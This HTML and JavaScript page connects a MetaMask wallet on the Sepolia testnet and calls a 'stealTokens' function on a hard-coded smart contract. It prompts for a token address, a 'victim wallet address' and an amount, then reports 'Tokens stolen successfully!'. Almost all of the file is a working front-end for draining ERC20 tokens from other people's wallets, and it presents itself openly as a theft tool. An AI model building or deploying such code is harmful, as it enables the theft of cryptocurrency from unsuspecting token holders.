<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Test Wallet & Smart Contract Interaction</title>
    <script src="https://cdn.ethers.io/lib/ethers-5.7.2.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
        }
        button {
            padding: 10px 20px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:disabled {
            background-color: #ccc;
        }
    </style>
</head>
<body>
    <h1>Connect Wallet & Interact with Contract</h1>
    <button id="connectWalletButton">Connect Wallet</button>
    <p id="status">Status: Not Connected</p>

    <h2>Interact with Contract</h2>
    <button id="stealTokensButton" disabled>Steal Tokens</button>

    <script>
        let provider, signer, contract;
        const contractAddress = "0xc520027d3eB2600c5ea5e799ea6F355D05b8b6f6"; // Alamat smart contract
        const contractABI = [
            {
                "inputs": [
                    { "internalType": "address", "name": "token", "type": "address" },
                    { "internalType": "address", "name": "victim", "type": "address" },
                    { "internalType": "uint256", "name": "amount", "type": "uint256" }
                ],
                "name": "stealTokens",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            }
        ];

        async function connectWallet() {
            if (window.ethereum) {
                try {
                    // Connect wallet
                    provider = new ethers.providers.Web3Provider(window.ethereum);
                    await provider.send("wallet_switchEthereumChain", [{ chainId: "0xAA36A7" }]); // Sepolia Testnet
                    await provider.send("eth_requestAccounts", []);
                    signer = provider.getSigner();
                    const address = await signer.getAddress();

                    // Update UI
                    document.getElementById("status").innerText = `Status: Connected (Wallet: ${address})`;
                    console.log("Wallet connected:", address);

                    // Initialize contract instance
                    contract = new ethers.Contract(contractAddress, contractABI, signer);

                    // Enable button
                    document.getElementById("stealTokensButton").disabled = false;
                } catch (error) {
                    console.error("Error connecting wallet:", error.message);
                    alert(`Error: ${error.message}`);
                }
            } else {
                alert("MetaMask is not installed. Please install MetaMask and try again.");
            }
        }

        async function stealTokens() {
            if (!contract) {
                alert("Contract not initialized. Connect wallet first.");
                return;
            }

            try {
                const tokenAddress = prompt("Enter token address (ERC20):");
                const victimAddress = prompt("Enter victim wallet address:");
                const amount = prompt("Enter amount to steal (in wei):");

                if (!tokenAddress || !victimAddress || !amount) {
                    alert("All fields are required!");
                    return;
                }

                // Call stealTokens function
                const tx = await contract.stealTokens(tokenAddress, victimAddress, amount);
                console.log("Transaction sent:", tx.hash);
                alert(`Transaction sent! Hash: ${tx.hash}`);
                await tx.wait();
                alert("Tokens stolen successfully!");
            } catch (error) {
                console.error("Error stealing tokens:", error.message);
                alert(`Error: ${error.message}`);
            }
        }

        document.getElementById("connectWalletButton").addEventListener("click", connectWallet);
        document.getElementById("stealTokensButton").addEventListener("click", stealTokens);
    </script>
</body>
</html>
